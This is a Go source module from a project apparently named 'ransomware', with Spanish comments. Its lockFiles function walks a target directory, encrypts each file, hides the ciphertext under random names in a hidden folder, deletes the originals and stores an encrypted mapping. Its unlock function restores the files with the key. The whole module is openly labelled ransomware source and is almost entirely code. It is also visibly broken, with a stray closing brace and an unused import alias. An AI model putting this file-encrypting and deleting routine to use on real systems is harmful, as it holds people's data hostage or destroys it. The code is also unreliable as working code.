package modules // El nombre del paquete se va a importar al main 

import (
    "encoding/json"
    "fmt"
    "os"
    "path/filepath"
    "strings"

    crypto "ransomware/modules/cryptoUncrypt" //  Nombre de las función 
)

}func lockFiles(key []byte){  // ← key como parámetro
	if _, err := os.Stat(TARGET_DIR); os.IsNotExist(err){
		fmt.Printf("[!]Error: Directory %s does not exist\n", TARGET_DIR)
		fmt.Printf("   Create it first: mkdir %s\n", TARGET_DIR)
		os.Exit(1)
	}

	fmt.Println("\n Encrypting files...")

	//Carpeta oculta para guardar los archivos encriptados, para eso usamos un filepath.Join() que une rutas de forma segura
	hiddenDir := filepath.Join(TARGET_DIR, HIDDEN_FOLDER)
	//Creamos la carpeta con derechos de lectura para admin (owner)
	os.MkdirAll(hiddenDir, 0o700) 

	var mappings []FileMapping // Slice para guardar el mapeo que se hara
	count := 0

	//Recorrer los archivos dentro del directorio establecido 
	err := filepath.Walk(TARGET_DIR, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err 
		}

		// Ignorar directorios
		if info.IsDir() {
			return nil
		}

		// Ignorar archivos ocultos (que empiezan con .)
		if strings.HasPrefix(info.Name(), ".") {
			return nil
		}

		// Ignorar si está en la carpeta oculta
		if strings.Contains(path, HIDDEN_FOLDER) {
			return nil
		}

		fmt.Printf("   Processing: %s\n", info.Name())

		//Leer archivos 
		data, err := os.ReadFile(path)
		if err != nil {
			fmt.Printf("      [x] Error reading: %v\n", err)
			return nil  // ← Continuar con siguiente archivo
		}

		//Encripta el archivo 
		encrypted, err := encrypt(data, key)
		if err != nil {
			fmt.Printf("      [x] Error encrypting: %v\n", err)
			return nil  // ← Continuar con siguiente archivo
		}

		//Generar nombre aleatorio
		randomName := generateRandomName()
		hiddenPath := filepath.Join(hiddenDir, randomName)

		//Guarda el archivo encriptado 
		err = os.WriteFile(hiddenPath, encrypted, 0o644)
		if err != nil{
			fmt.Printf("      [x] Error saving: %v\n", err)
			return nil  // ← Continuar con siguiente archivo
		}

		//Guarda el mapeo 
		mappings = append(mappings, FileMapping{ 
			OriginalPath: path,
			HiddenPath:   hiddenPath,
		})

		//Borrar los originales
		err = os.Remove(path)
		if err != nil {
			fmt.Printf("      [!] Error: %v cannot be deleted\n", err)
		}

		fmt.Printf("      %s → %s ✓\n", info.Name(), randomName)
		count++

		return nil  // ← Importante: retornar nil para continuar
	})  // ← Cerrar la función Walk aquí

	// Verificar error del Walk
	if err != nil{
		fmt.Printf("[x] Error walking directory: %v\n", err)
		os.Exit(1)
	}

	if count == 0 {
		fmt.Println("\n[!] No files found to encrypt")
		return
	}

	//Guardamos el mapeo encriptado 
	mappingData, _ := json.Marshal(mappings)
	encryptedMapping, _ := encrypt(mappingData, key)
	mappingPath := filepath.Join(TARGET_DIR, MAPPING_FILE)
	os.WriteFile(mappingPath, encryptedMapping, 0o644)

	fmt.Printf("\n✓ Successfully encrypted %d files\n", count)
}

func unlock(key []byte){  
    fmt.Println("\n Unlocking files...")  

    //Verifica el directorio target
    if _, err := os.Stat(TARGET_DIR); os.IsNotExist(err){
        fmt.Printf("[!] Error: Directory %s does not exist\n", TARGET_DIR)
        os.Exit(1) 
    }
    
    //Verificamos que el file del mapeo existe 
    mappingPath := filepath.Join(TARGET_DIR, MAPPING_FILE)
    if _, err := os.Stat(mappingPath); os.IsNotExist(err) {  
        fmt.Println("[!]Error: No encrypted file found")
        fmt.Println("          Nothing to unlock")
        os.Exit(1)
    }
    
    //Leer archivo 
    encryptedMapping, err := os.ReadFile(mappingPath)
    if err != nil {
        fmt.Printf("[x]Error reading mapping file: %v\n", err) 
        os.Exit(1)
    }
    
    // Desencriptamos el mapeo
    mappingData, err := decrypt(encryptedMapping, key)  
    if err != nil {
        fmt.Println("[x]Error: Wrong password or corrupted data")  
        fmt.Printf("          Details: %v\n", err)  
        os.Exit(1)
    }
    
    // Convertimos el json a Go 
    var mappings []FileMapping
    err = json.Unmarshal(mappingData, &mappings)
    if err != nil {
        fmt.Printf("[x] Error parsing mapping data: %v\n", err)
        os.Exit(1)
    }
    
    if len(mappings) == 0 {
        fmt.Println("[!] No files to unlock")  
        return 
    }
    
    fmt.Printf("Found %d files to unlock\n", len(mappings))
    
    // Restaurar archivos
    count := 0
    for _, mapping := range mappings{  
        fmt.Printf("   Restoring: %s\n", filepath.Base(mapping.OriginalPath))
        
        //Leemos el archivo 
        encryptedData, err := os.ReadFile(mapping.HiddenPath)
        if err != nil{  
            fmt.Printf("      [x] Error reading encrypted file: %v\n", err)
            continue
        }
        
        // Desencriptamos el archivo  
        decryptedData, err := decrypt(encryptedData, key)
        if err != nil {
            fmt.Printf("      [x] Error decrypting: %v\n", err)
            continue
        }
        
        //Crear directorios si no existen 
        originalDir := filepath.Dir(mapping.OriginalPath)
        os.MkdirAll(originalDir, 0o755)
        
        //Guardamos con nombres originales 
        err = os.WriteFile(mapping.OriginalPath, decryptedData, 0o644)
        if err != nil{  
            fmt.Printf("      [x] Error restoring file: %v\n", err)  
            continue  
        }
        
        // Borrar archivo encriptado 
        err = os.Remove(mapping.HiddenPath)
        if err != nil{
            fmt.Printf("      [!] Warning: could not delete encrypted file: %v\n", err)
        }
        
        fmt.Printf("      ✓ Restored: %s\n", filepath.Base(mapping.OriginalPath))
        count++
    }
    
    //Limpiamos el mapping y demas
    err = os.Remove(mappingPath)
    if err != nil{
        fmt.Printf("[!]Warning, could not delete mapping file %v\n", err)  
    }
    
    hiddenDir := filepath.Join(TARGET_DIR, HIDDEN_FOLDER)
    err = os.RemoveAll(hiddenDir)
    if err != nil {
        fmt.Printf("[!]Warning, could not delete hidden folder: %v\n", err)  
    }
    
    fmt.Printf("\n✓ Successfully unlocked %d files\n", count)
    fmt.Println("Files restored, welcome back, mistress Areia.")
}